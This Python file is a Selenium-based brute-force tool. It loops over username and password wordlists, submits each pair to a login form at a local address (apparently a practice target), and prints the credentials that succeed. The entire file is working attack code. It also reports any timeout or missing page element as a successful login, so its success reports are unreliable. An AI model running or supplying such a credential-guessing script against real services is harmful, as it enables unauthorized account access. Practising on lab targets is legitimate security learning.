from selenium import webdriver 
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
import time

lst_usernames = []
lst_passwords = []

def key_mover(username_file="username.txt",password_file="password.txt"):

    # Moving & Creating Pattern List
    with open(username_file , "r") as x :
            usernames = x.readlines()
            for index in usernames:
    #
                lst_usernames.append(index)

    with open(password_file , "r") as y :
            passwords = y.readlines()
            for index in passwords:
   #
                lst_passwords.append(index)

    # Indexing & Fixing Pattern
    for i in lst_usernames:
        if '\n' in i:
            index_value = lst_usernames.index(i)
            print(f"{index_value}::{i}")
            changed_pattern = i.replace('\n',"")
            lst_usernames[index_value] = changed_pattern
    print(lst_usernames)

    for i in lst_passwords:
        if '\n' in i:
            index_value = lst_passwords.index(i)
            print(f"{index_value}::{i}")
            changed_pattern = i.replace('\n',"")
            lst_passwords[index_value] = changed_pattern
    print(lst_passwords)

def Brute_Forcer():
    global lst_usernames
    global lst_usernames

    try :

        key_mover()

        for username in lst_usernames:
            for password in lst_passwords:
                print(f"trying with:\nusername: {username}\npassword: {password}")

                chrome_options = Options()

                # Add any desired Chrome options, e.g., headless mode for Jenkins
                chrome_options.add_argument("--headless")
                chrome_options.add_argument("--no-sandbox") # Important for Jenkins
                chrome_options.add_argument("--disable-dev-shm-usage") # Important for Jenkins
                chrome_options.binary_location = "/usr/bin/google-chrome-stable"

                # Replace with the actual path to your chromedriver executable
                service_driver = Service("/usr/local/bin/chromedriver-linux64/chromedriver")
                driver = webdriver.Chrome(service=service_driver , options=chrome_options)
                
                driver.get('http://127.0.0.1:8081/login.php')
                WebDriverWait(driver ,2).until(
                    EC.presence_of_all_elements_located((By.NAME ,"username"))
                )
                username_input = driver.find_element(By.NAME ,"username")
                username_input.send_keys(username)

                WebDriverWait(driver ,2).until(
                    EC.presence_of_all_elements_located((By.NAME ,"password"))
                )
                password_input = driver.find_element(By.NAME ,"password")
                password_input.send_keys(password)

                WebDriverWait(driver ,5).until(
                    EC.presence_of_all_elements_located((By.NAME ,"Login"))
                )
                login_button = driver.find_element(By.NAME ,"Login")
                
                login_button.click()
                time.sleep(5)
                
                WebDriverWait(driver ,3).until(
                    EC.presence_of_all_elements_located((By.ID,"content"))
                )
                content = driver.find_element(By.ID,"content")
                #print(content.text)
                if "Login failed" in content.text:
                    print("Login failed !!")
                    driver.quit()
                    continue
                else:
                    print(f"Login passed ! with\nusername:{username}password-key:{password}")
                    return "\nAccess Authurized !"
                
    except TimeoutException:
        print(f"Login passed ! with\nusername:{username}\npassword-key:{password}")
        return "\nAccess Authurized !"
    except NoSuchElementException :
        print(f"Login passed ! with\nusername:{username}\npassword-key:{password}")
        return "\nAccess Authurized !"
             
Brute_Forcer()